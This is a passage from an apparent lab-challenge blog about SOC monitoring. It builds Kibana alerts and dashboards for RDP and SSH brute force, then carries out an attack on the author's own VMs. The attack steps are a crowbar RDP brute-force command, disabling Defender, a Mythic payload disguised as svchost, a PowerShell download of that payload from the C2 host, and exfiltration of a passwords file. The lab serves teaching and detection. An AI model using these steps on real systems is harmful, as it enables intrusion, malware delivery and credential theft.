1. **Turn RDP Off** - This can be used in dev environments and once a project reaches the production stage RDP can sometimes never get disabled.  If it's not used or needed it's better to turn it off.
2. **Use Multifactor Authentication** - MFA should be used whenever availabled to proved you with an additional layer of protection.  MFA is not guaranteed to protect you 100% but is a good deterrent and better than not having it enabled at all.
3. **Restrict Access** - A firewall or VPN is a good way to prevent unauthorized access.  These options can prevent the majority of brute force attacks from attackers.
4. **Better Passwords** - A good password policy should always be implemented in a company environment or personal use.  15+ characters with uppercase, lowercase, numbers, and special characters.  For even more security a Priviledged Access Managemennt tool (PAM) which provides you with a one time password.
5. **Change Default Accounts** - Whenever possible change these accounts to something other than the norm.  As well as not using the same logins for all your accounts  Think about it this way, if attackers already know your username and/or password because it was a left as default, that's one step closer for attackers to gain access to your accounts/logins.


## Day 16 - How To Create Alerts and Dashboards in Kibana (Port 2)
**Objective:  Observe authentication logs from our Windows server and create an alert.**

**Create RDP Brute Force Alert**

- Click on the Hamburger menu and select Discover.
- Ensure your timeframe is set for "Today".  Take note of how many alerts you have listed right above your timestamp column of alerts (eg. Documents (89,420)).
- Click on the agent.name on the left hand side and choose the plus button for your MyDFIR Windows listing.
- Notice how many alerts we've filtered down to (eg. Documents (30,368)).

Just like in our SSH brute force filter we're looking for the same three fields:
- Failed attempts
- User
- Source IP

Now we need to find out what Event ID is associated with failed authentication for Windows.  Lets search the internet for `failed authentication event id windows`.
We get the following result:

**Event ID 4625:** An account failed to log on (local computer)
- This event is generated on the computer where the logon attempt was made.
- It provides information about the account name, logon type (e.g., interactive, network), and the reason for failure.

Event ID 4625 is what we're looking for.  Let's try filtering for this Event ID in Elastic.  We'll just type "4625" in the filter box at the top.  Nice!  This should filter the events down even further (eg. Documents (5,044)).  If you open one of the alerts let's see what field event ID 4625 is under. 

![Elastic event.code field](https://github.com/user-attachments/assets/b38b96d4-70ea-4899-8380-40bf5edbe521)

So event.code is what we want.  (** Note:  event.code can also be seen before the highlighted event id 4625 in each alert). To confirm this we can add this to the filter field at the top where we entered our event id 4625 earlier.  So we'll enter `event.code: 4625`.

Now let's add source IP to our filter in the search box under all the fields on the left hand side we'll  search for `source.ip`.  If we click on the source.ip result it should list all the ip address results in the values box that pops up next to it.  We'll click on the plus button at the top of this box.

Let's add the user next.  In the same search box we used for source.ip we'll seach for `user.name`.  The two results that are closed to what we want are winlog.user.name and user.name.  There's no data in the winlog listing but there are values in the user.name so we'll click on the plus sign button ot add it to our columns.  
We can confirm user.name by opening up one of the alerts and looking at the message field which shows "Account Name: ADMINISTRATOR".  And this matches what's on the user.name column along with the IP listed in the source.ip column for the alert we opened.

I even went and added the country field as well so I could see where the attempts are coming from. `source.geo.country_name`.

Finally, we'll save this filter with the blue save button at the top right corner of the page.  A smaller windows should pop up and we'll give it a name of `RDP Failed Activity` and click the blue save button at the bottom of the window.

We can confirm this filter works with RDP by by making a failed attept to log into RDP on your host PC to the MyDFIR Windows VM.  Once completed you should get an alert with your host PC's IP address.

** Create Threshold Rule for both SSH and RDP **

On the same Discover page where we created our RDP filter in the last section we'll click on 'Alerts' at the top right and select "Create search threshold rule".
- We'll give it a name of `MyDFIR-SSH Brute Force Activity-(your handle)`.
- Under "Define your query" verify you have "event.code: 4625" listed.
- Adjust the 'IS ABOVE' field from 1000 to 5.
- We'll test it with the "Test query" button and you if it worked you should get a query matched documents result just below the button.
  eg. "Query matched 24 documents in the last 5m".
- Click the save button at the bottom right.

To view our alerts you can click on the hamburger menu, click on "Stack Management" under Management, and choose "Alerts" under Alerts and Insights.  If you click on the three dots a the beginning of the alert and select "view alert details" we can see the more information about the alert.

As you can see these alerts do not have much info in them.  There is a better way to show the type of info that is in our filters like the Discover panel.

- Click on the Hamburger menu.
- Under Security select "Rules".
- Next choose "Detection rules (SIEM)".
- Click on the blue "Create new rule" button at the top right.
- In the middle under Define rule we'll select "Threshold".
- In the custom query field we can enter `system.auth.ssh.event : * and agent.name: MYDFIR-Linux-(your handle name) and system.auth.ssh.event: Failed and user.name: root`.
- In the Group by field we'll enter `user.name` and `source.ip`.
- In the Required fields we'll add two separate fields with the same items:  `user.name` and `source.ip`.
- Click on the blue "Continue" button.
- For the 2. About rule section we'll call it `MyDFIR-SSH-Brute-Force-Attempt-(Your Handle)`.
- In Description we can enter `This rule detects failed authenticaitons towards the account: root`.
- We'll set the Default severity drop down to "Medium".
- In the Advanced settings we'll add in the "Custom Highlighted fields" with `source.ip`.

There are some nice options in the Advanced settions to halp analysts with investigations like a URL which might show an exmaple of a type of attack with references to tatics from the MITRE Attack Framework.  There are also text fields for a Setup guide and Investigation guide where you can add your own custom documentation depending on on your SOC's rules and processes you follow.

- Scroll to the bottom and click on the blue "Continue" button.
- For the 3. Schedule rule we'll adjust both "Runs every" and "Additional look back time" to 5 minutes.
- Click the blue "Continue button.
- Step 4 can be left as default and we'll click on the blue "Create & enable rule" button.

We'll create one more rule for RDP.  Everything is the same except for the following:
- In the custom query field we can enter `event.code: 4625 and agent.name: MYDFIR-WIN-(Your Handle) and user.name: Adminstrator`.
- For the 2. About rule section we'll call it `MyDFIR-RDP-Brute_Force Atempt-(Your Handle)`.
- In Description we can enter `This rule detects failed authentication towards the account Administrator via RDP`.
- For the 3. Schedule rule we'll adjust "Runs every" to 1 minute and "Additional look back time" to 5 minutes.

Overtime once we start collecting alerts we should see the following layout under the Security -> Alerts section.

![Elastic Security Alerts Layout](https://github.com/user-attachments/assets/78783bd4-cb53-4171-b6b8-d47acfffc41c)


## Day 17 - How To Create Alerts and Dashboards in Kibana (Part 3)
**Create a dashboard for RDP activity**

Similiar to Day 14 we're going to create a dashboard but this time for our RDP telemetry.

- Click on the hamburger menu and select maps.
- From our RDP filter we created we'll paste this into the filter field at the top `event.code: 4625 and agent.name: MYDFIR-WIN-(Your Handle)`
- Make sure our timeframe is set to "Last 7 days" at the top right.
- And we'll click on the blue "Add Layer" button.
- Select the "Choropleth" option in the list.
- In the EMS boundaries drop down select "World Countries".
- In the Data view drop down we'll pick the longest one that should be listed starting with "alerts-security.alerts-default,apm-*...",
- In the join field drop down we'll choose "source.geo.country_iso_code".
- Click the blue "Add and continue" button and the blue "Save" button at the top right.
- In the Save Map window that pops up we'll name it `RDP Failed Authentications`
- Under the "Existing" drop down we'll select our existing dashboard "MyDFIR Authentication Activity".
- Click on the blue "Save and go to Dashboard" button.

Now you should see a third map on your dashboard for failed RDP attampts.

![Elastic dashboard view with RDP failed map](https://github.com/user-attachments/assets/91cd79ac-6c65-4ebd-b4cd-47a693a11930)

Like our SSH maps let's make a successful RDP authentications map as well.  We'll need to look up the some additional info for Event ID 4624.

[https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=4624](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=4624)

This page shows us there are two successful logon types for Event ID 4624 which we'll have to incorporate in our query.

- **Logon type 7**:  Unlock (i.e. unnattended workstation with password protected screen saver)
- **Logon type 10**:  RemoteInteractive (Terminal Services, Remote Desktop or Remote Assistance)

If we go back to our Discover panel we can filter at the top for just `event.code:4624` for the last 7 days.  Let's open one of the alerts and on the right hand panel we'll search at the top for "logon".  There should be one listing for "winlog.event_data.LogonType" with a value of 5.

Ultimatesecurity.com lists logon type 5 as "Service (Service startup)".  So this looks like what we want.  We'll add the following to our filter to look for logon types 10 & 7.
`event.code: 4624 and (winlog.event_data.LogonType: 10 or winlog.event_data.LogonType: 7)`.  and if you've logged into your Windows VM in the past week (Which I hope you have if you're participating in the challenge) you should see a logon attempt from your own host PC.  Let's save this query so we have it for future use.  Click the blue "Save" button at the top and we'll call it `RDP Successful Activity`.  Toggle the option on at the bottom left "Save as new search" and then click the blue "Save" button at the bottom right.

Now we'll go back to our dashboard and on the bottom "RDP Failed Authentication" map we'll click on the three dots at the top right corner of the map and select duplicate.  We'll rename the title in the map on the right by click on the title.  We'll call it `RDP Successful Authentications` and we'll edit our query down below to the one we created above.
`event.code: 4624 and (winlog.event_data.LogonType: 10 or winlog.event_data.LogonType: 7)`. and click on the blue "Save and return" button at the top right.

**Table Creation**

The next thing we can do is show the info from the maps in a table format.  This will enhance the data on the maps and make it easier to read at a glance.  Back on our dashboard with our four maps we'll perform the following steps:

- Click on the blue "Create Visualization" button at the top left.
- Find your failed SSH query and paste it into the filer field at the top and click refresh at the top right.  eg. query `system.auth.ssh.event : * and agent.name: MYDFIR-Linux-(Your Handle) and system.auth.ssh.event: Failed`
- Adjust the timeframe to "Last 7 Days" on the top right.
- On the right hand side change the drop down from "Bar vertical stacked" to "Table".
- Find the following fields on the left and drag them to the center. (user.name, source.ip, source.geo.country_name).
- On the right in the "Rows" adjust the columns so it's in the order we added them in again (user.name, source.ip, source.geo.country_name).
- In "Rows" on the right click on the "Top 3 values of user.name" and change the "Number of values" to 10.  Under Advanced un-toggle the "Group remaining values as 'Other'".
- Just like the last step peform ths for source.ip and source.geo.country_name as well.
- Click the blue "Save and return" button at the top right.

Back on our dasboard you should have a table.  We'll name our table by clicking on the title bar, where it says, "[No Title]" and give it a name of `SSH Failed Authentications [Table]` and click the blue "Apply" button at the bottom right.  Now we can drag this above so it's just below our SSH Failed Authentications map by dragging it with the tile bar.

We can create a successful table just like we did with the maps by clicking on the three dots at the top right of the table and selecting "Duplicate".  We'll rename the new table as `SSH Successful Authentications [Table]` and down below on the same window we'll click on "Edit" by Query and change the query string at the top by changing "Failed" at the end to "Accepted" and click on the blue "Save and return" button at the top right.

**Note** if some of your tables or maps are different sizes, or you just want to adjust them, you can so by dragging the bottom right hand corner (Your mouse icon should change to a diagonal double arrow when you hover over the corner).

Now we can do the same thing for RDP by dupicating the failed SSH table.  Drag the table to the bottom left below the RDP Failed Authentications map and we'll rename it to `RDP Failed Authentications [Table]`. And, like the above step, we'll edit the query below in the same window.  Change the query to our RDP query string `event.code: 4625 and agent.name: MYDFIR-WIN-(Your Handle)` and click on the blue "Save and return" button.

To duplicate the successful table we'll first copy the query string from the RDP Succssful map `event.code: 4624 and (winlog.event_data.LogonType: 10 or winlog.event_data.LogonType: 7)`.  We'll duplicate the failed RDP table and edit the table name and query string in the duplicated table.  When you're all done make sure to hit the blue "Save" button at the top right to save all your work.

You should now have 4 maps and 4 tables for SSH and RDP to view all the brute force attacks.


## Day 18 - Command and Control Introduction
**Objective:  What is a C2?  Why is it important?  What are some of the tools/frameworks?  What is Mythic and how does it work?**

### Command & Control:  What is it?
"Command and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network"

[https://attack.mitre.org/tactics/TA0011/](https://attack.mitre.org/tactics/TA0011/)

### Command & Control:  Why is it important?
So attackers can get one step closer to performing their objective such as Credential Access, Lateral Movement, Exfiltration of data, or impact.

### Command & Control:  Comon Tools/Frameworks
There are a ton of C2's out in the wild but here are some of the more common ones:
- **METASPLOIT** from Rapid 7 - Built into Kali Linux and is quite easy to use with many exploits and auxiliaries available [https://www.metasploit.com/](https://www.metasploit.com/)
- **COBALT STRIKE** from Fortra - This is more commerically used and probably the most common.  This makes it easier to detect in the industry.  [https://www.cobaltstrike.com/](https://www.cobaltstrike.com/)
- **SLIVER** from Bishopfox - This framework is open source and convenient to get setup and started with. [https://bishopfox.com/tools/sliver](https://bishopfox.com/tools/sliver)
- **MYTHIC** from Cody Thomas - Built with GoLang, Docker, Docker Compose, and a web browser interface.  You can track your payloads and C@ profiles.
[https://docs.mythic-c2.net/](https://docs.mythic-c2.net/)



## Day 19 - How To Create an Attack Diagram
**Objective:  Create an attack diagram that maps out your plan of attack.**

![Attack Diagram](https://github.com/user-attachments/assets/ef175dc9-29db-4070-bd1e-b0ef3724e200)



## Day 20 - Mythic Server Setup Tutorial
**Objective:  Setup Mythic C2 Server and learn how Mythic works.**

In VULTR (or your cloud provider of choice) we're going to spin up an Ubuntu 22.04 VM for our Mythic C2 Server.  The minimum you specs you want to use is 2 CPUs and 4 GB of RAM.  We also chose Cloud Compute-Shared CPU without Auto Backups or IPv6.  And for the Server Hostname we called it `MyDFIR-MYTHIC`.

While that's getting ready you can go to Kali.org and download the Kali Linux Hypervisor vm of your choice.  If you don't already have it you will also need to download a copy of 7-Zip from 7-zip.org.  Once you have 7-Zip installed and the VM file is downloaded you can execute the .vmx file which should open in the you default VM.

Back to our Mythic VM in the cloud we can SSH into it with you CLI of choise with the credentials listed on your cloud provider.  And, just like before, we'll updated it with the following:
```apt update && apt upgrade -y```

Now we can start installing our prerequisites for Mythic.
- **Docker Compose** - `apt install docker-compose`
- **Make** - Should already be install.  At the time of this blog the latest version is 4.3-4.1build1.
- **Mythic** - `git clone https://github.com/its-a-feature/Mythic`

Once Mythic is cloned we'll move into the Mythic directory `cd Mythic`.  Next we want to install the Ubuntu version of Docker with the following commmand: `install_docker_ubuntu.sh `.  Let's restor our docker service by entering: `systemctl restart docker` and then we'll verify it's running by entering `systemctl status docker`.  Hopefully, you should get somethijng like the below listing.

```
root@MyDFIR-MYTHIC:~/Mythic# systemctl status docker
● docker.service - Docker Application Container Engine
     Loaded: loaded (/lib/systemd/system/docker.service; enabled; vendor preset: enabled)
     Active: active (running) since Sun 2024-09-22 02:56:48 UTC; 2s ago
TriggeredBy: ● docker.socket
       Docs: https://docs.docker.com
   Main PID: 29662 (dockerd)
      Tasks: 9
     Memory: 20.4M
        CPU: 451ms
     CGroup: /system.slice/docker.service
             └─29662 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
```

The next thing we'll run is the command `make`. This should finish right away.  And finally we can start the Mythic CLI with: `./mythic-cli start`

For our Mythic C2 Server let's also add a firewall on it to only allow our IP through and avoid tons of scan attampes from bots and attackers.  We can add our host IP on all ports for SSH along with the RDP Windows Server and the SSH Linux Server fir TCP on all ports.

Now we should be able to log into our Mythc dsshboard with your Mythic Server IP from your cloud VM using https and port 7443.  The username will be `mythic_admin` and you can find your password under the hidden file .evn in the Mythic directory.  You can run `cat .env` and it will be listed under "MYTHIC_ADMIN_PASSWORD".

There are lots of options in here that we'll use in the coming days.  Feel free to explore the options to get comfortable with what each section does.

![Mythic Dashboard](https://github.com/user-attachments/assets/1769b4bd-30e4-4cae-ad7a-ed61083d0a70)


## Day 21 - Mythic Agent Setup Tutorial
**Objective:  Learn how to perform a brute force attack, generate a Mythic agent and establish C2.**

The first thing we're going to do is change our password on the Windows VM to something that won't take hours to brute force as this challenge is for learning purposes.  We'll console into our Windows VM.  We'll need to make some policy changes first before it accepts an easier password.  We'll open up the "Local Group Policy Editor" by searching in the start menu for "Edit Group Policy".  Once open we'll drill down to the following:
- Windows Settings
- Security Settings
- Account Policies
- Password Policy

We'll change "**Minimum password length**" to "**5**" and "**password must meet complexity requirements**" to "**Disabled**"

![Windows Local Groupp Policy Editor](https://github.com/user-attachments/assets/3c7b9e00-ad9d-4d8c-85b8-3ca9dea8e73d)

Now in the start menu we'll click on the user name "Administrator" at the top of the first column and select "Change account settings".  On the next window we'll click on "Sign-in-options".  Under the "Password" option we'll click on "Change".  Enter in your current password and then change it to something simple like the video "Winter2024!" if you like.

Next we'll add this new password into a text file in the Documents folders and name the file "passwords.txt".

Now we're ready to peform our attack plan from the attack diagram we created on Day 19.  We'll log into our Kali VM and open a terminal.  The first thing we need to do is update our Kali:
```
sudo apt update && sudo apt upgrade -y
```
Let's navigate to the following directory where the built in wordlists are found on Kali Linux:
```
cd /usr/share/wordlists
```
The most common wordlist is rockyou.txt which we have here but it is in a gzip format so we'll unzip it with:
```
sudo gunzip rockyou.txt.gz
```
And enter in your password.

![Kali - unzip rockyou.txt.gz](https://github.com/user-attachments/assets/aa2234b7-6023-4e4d-8bdb-a43a9494310e)

Because this is such a large file we're just going to copy the first 50 passwords into a new file for us to brute force with.
```
head -50 rockyou.txt > home/kali/mydfir-wordlist.txt
```
Now we'll add our Windows password to our new list in our home directory by the following commands.

`cd` and `nano mydfir-wordlist.txt`

At the bottom of the wordlist we'll add in our new Windows password and we'll exit with ctrl+x, Y, and, hit the enter key.

Next we're going to install a tool call 'Crowbar":
```
sudo apt install crowbar
```
Once installed we can see all of Crowbar's options with `crowbar -h`.  


**Phase 1 - Initial Attack**

Create a text file called target.txt and enter in your Windows VM IP address:
```
echo <Your Windows VM IP> > target.txt && echo Administrator >> target.txt
```
**PLEASE NOTE** - Please only use crowbar for targets that you own (Like in this lab) or for targets you have explixit permission to do so on.

We'll use the following command to execute Crowbar.
```
crowbar -b rdp -u Administrator -C mydfir-wordlist.txt -s <Your Windows VM IP>/32
```
- **-b**: is brute force with RDP.
- **-u**: is for user.  In our case Administrator.
- **-C**: is for the wordlist file we want crowbar to use which is mydfir-wordlist.txt.
- **-s**: is for the server we're pointing it to which is our Windows Server VM.

We also added a **CIDR notation** or **slash notation** of /32 which specifies the size of the subnet we want to scan.  More info aboiut this can be found below.

[Amazon Web Services - What is CIDR?](https://aws.amazon.com/what-is/cidr/)

```
──(kali㉿kali)-[~]
└─$ crowbar -b rdp -u Administrator -C mydfir-wordlist.txt -s <Your Win VM IP>/32
2024-09-23 14:12:23 START
2024-09-23 14:12:23 Crowbar v0.4.2
2024-09-23 14:12:23 Trying <Your Win VM IP>:3389
2024-09-23 14:12:33 RDP-SUCCESS : <Your Win VM IP>:3389 - Administrator:<YOUR WIN VM password>
2024-09-23 14:12:33 STOP
```

Now that we have the credentials as the attacker we can use a tool called "xfreerdp" to connect to the server.
```
xfreerdp /u:Administrator /p:<Your WIN password> /v:<Your WIN IP>:3389
```
It will ask you if you trust the certificate.  We'll enter `Y`.  And just like in the movies "We're in!".

![Kali xfreerdp session](https://github.com/user-attachments/assets/ad9e59b6-6720-4544-8fb1-7790d95abbc0)


**Phase 2 - Discovery**

We can now open a command prompt (click start and start typing 'command') and we can run the commands Phase 2 commands from our attack diagram.

**whoami**
```
mydfir-win-(Your handle)\administrator
```

**ipconfig**
```
Windows IP Configuration


Ethernet adapter Ethernet Instance 0:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : (Win VM IPv6)
   IPv4 Address. . . . . . . . . . . : (Win VM IPv4)
   Subnet Mask . . . . . . . . . . . : 255.255.254.0
   Default Gateway . . . . . . . . . : (Win VM IP Gateway)
```

**net user**
```
User accounts for \\MYDFIR-WIN-(Your handle)

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
WDAGUtilityAccount
The command completed successfully.
```

**net group**
```
This command can be used only on a Windows Domain Controller.

More help is available by typing NET HELPMSG 3515.
```

A bonus command

**net user administrator**
```
User name                    Administrator
Full Name
Comment                      Built-in account for administering the computer/domain
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            9/23/2024 5:10:22 PM
Password expires             Never
Password changeable          9/23/2024 5:10:22 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   9/23/2024 6:21:04 PM

Logon hours allowed          All

Local Group Memberships      *Administrators
Global Group memberships     *None
The command completed successfully.
```

"net user (user name)" is more useful when you first game access and you want to know what groups the user is associalated with in order to start escalating your privillages as you normally wouldn't gain admin rights on the first attempt.  However, this command will help with our telemetry.


**Phase 3 - Defense Evasion**

Normally, we could enter in a Powershell command to peform this but for simplicity we'll just disable it in the Security settings.  Click start and search for `Windows Security`.  click on "Virus & threat protection" and the "Manage settiings" option.  And we'll just diable all four of the options on this page.
- Real-time protection
- Could-delivered protection
- Automatic sample submission
- Tamper Protection

![Windows Defender - Virus & threat protection settings](https://github.com/user-attachments/assets/3887c63f-27bb-418b-ba42-4e4d5b97e62b)


**Phase 4 - Execution**

Now it's time to build our Mythic Agent.  Let's log into out Mythic instance we created on Day 21 with the Mythic dashboard and an SSH instance on your host PC.

Here is a list of Mythic Agents and which ones are avaialble for each type of OS and their C2 Profile availablility:

[https://mythicmeta.github.io/overview/agent_matrix.html](https://mythicmeta.github.io/overview/agent_matrix.html)

For this challenge we're going to be using **Apollo**.  We'll run the following in our CLI to install Apollo:
```
./mythic-cli install github https://github.com/MythicAgents/Apollo.git
```
You should now see an Apollo agent in the "C2 Services & Payload types" (The headphone icon) section of your Mythic dashboard.

![Mythic Dashboard - Apollo agent](https://github.com/user-attachments/assets/101a458f-2376-4ddc-8102-e5fd778f784f)

We'll also look up a list of Mythic C2 Profiles:

[https://github.com/MythicC2Profiles](https://github.com/MythicC2Profiles)

For this challenge we're going to be using "HTTP".  On the CLI for Mythic we'll run the following to install the HTTP C2 profile:
```
./mythic-cli install github https://github.com/MythicC2Profiles/http
```
And now you should see the HTTP C2 Profile on your Mythic dashboard in the same ""C2 Services & Payload types" section.

![Mythic Dashboard - HTTP C2 Profile](https://github.com/user-attachments/assets/60b4d7cf-62f8-419c-aaf5-343d16bd3e40)

To create a payload we'll go into the "biohazard" icon for payloads on our Mythic dashboard and we can clicl on the "Actions" button on the right hand side and select "Generate New Payload".

![Mythic Dashboard - Payload - Actions - Generate New Payload](https://github.com/user-attachments/assets/2167c39f-6e18-4ca4-813b-9ff0aa85b779)

**Select Target Operating System**

Select "Windows" as your target Operating System and click on the "Next" button at the bottom.  

**Select Target Payload Type**

We'll leave the value as default "WinExe".  You can also select different payload options if you have more than one agent but since we only have "apollo" we'll click on the "Next" button.

**Select Commands**

You can customize your Agent with the commands you want to make the payload as small or large as you want.  For educational purpose we'll add them all to the right hand side under "Commands Included" using the double arrow button poiting to the right.

There is also a "DOCUMENTAITON" button at the bottom right hand corner which will go into more detail about all of the commands.  Definitely worth a read.

We'll click on the "Next" button.

**Select C2 Profiles**

Enable the "http" toggle option to include this profile.  For the "**Callback Host**" Parameter we'll change this to "http and change this to our Mythic Server IP found in your VULTR or cloud provider you're using.  Everything else can be left as default and we'll click on the "Next" button.

**Payload Review**
If you are participating in the 30 day challenge you'll need to change the **apollo.exe** to the following:
```
svchost-(Your Handle).exe
```
And we can give it a despription of:
```
MyDFIR 30 Day Challenge Payload/Agent
```
Once the payload has completed it's build process you can right click on the "Download here" link and paste it on your notepad for later.

Now let's see if we can make the payload a bit smaller and easier to use.  We'll run the following with our payload link in our Mythic CLI:
```
wget (Your payload link) --no-check-certificate
```
Now when we run the "file" command on the new file it created it shows the following:
```
file <your file name>
<Your file name>: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
```
Now we can mimply rename the file:
```
mv <Your file name> svchost-<Your handle>.exe
```
Now we can create a directlory named something small like the number 1 and move our payload there.
```
mkdir 1
mv svchost-(Your handle).exe 1/
cd 1
ls
```
Next we'll open up some ports on our Mythic VM's firewall and then start up a simple python server from the Mythic CLI:
```
ufw allow 80
ufw allow 9999
python3 -m http.server 9999
```

**Phase 5 Command & Control**

Now if we go over to our Kali RDP session we'll open up a Powershell with Admin (right click start and select Windows PowerShell (Admin) and we'll run the following command:
```
Invoke-WebRequest -Uri http://(Your Mythic VM IP):9999/svchost-(Your Handle.exe -OutFile "C:\Users\Public\Downloads\svchost-(Your Handle).exe"
```
If we run a netstat on our Kali RDP session, in a new PowerShell session we can see that our payload has established a session.
```
netstat -anob

...
TCP    <Your WIN VM IP>:62483    <Your Mythic VM IP>:80      ESTABLISHED     7500
 [svchost-<Your Handle>.exe]
```

Under the "Active Callbacks" tab (the telephone icon) on our Mythic dashboard we cab see ab estaablished connection.

![Mythic Dashboard - Callback tab](https://github.com/user-attachments/assets/e323fe50-0984-4268-b0fc-03f0d244e341)

If you click on the small red keyboard icon under the "Interact" column we can run the same commands from here that we did on our RDP session.

![Mythic Dashboard - Callback tab - Running agent commands](https://github.com/user-attachments/assets/7f924db0-6378-4430-b08c-2a39f38409a7)

You can find the commands under the Help menu at the top right hand corner of your Mythic dashboard for "Agent Documentation".

![Mythic Dashboard - Help Menu - Agent Documentation](https://github.com/user-attachments/assets/3256a958-348e-41f9-be92-d42e4cb3152b)

![Mythic Dashboard- Agent Documentation](https://github.com/user-attachments/assets/457a0462-3692-43b4-804a-59493cee94a1)


**Phase 6 Exfiltration**

Let's attempt to extract the "passwords.txt" file from the Windows VM we created in the Aministrators Documents folder from our C2.  The Mythic command documentation shows a download option we can use.

![Mythic command documentation for Download](https://github.com/user-attachments/assets/bd5232d3-2b78-42e4-a285-db56361be67b)

Let's try running the floowing on the "Callbacks" tab of our Mythic dashboard:
```
download C:\Users\Administrator\Documents\passwords.txt
```
And if the path is correct is should show on the dashboard it was extracted and even display the contacts of the file (blanked out for security purposes).

![Mythic dashboard - Call back tab - Download command results5](https://github.com/user-attachments/assets/2a426fb6-a120-491a-ac1e-6e8b23b8c1f6)

the file will be shown under the "File" tab (The paperclip icon).  You can even click on the down arrow under the "More" column which shows you the hashes for the passwords.txt file.

![Mythic dashboard - File tab - Downoaded file display with More display option (hashes)](https://github.com/user-attachments/assets/526e72c3-43d6-422f-9e42-6e22e559da01)


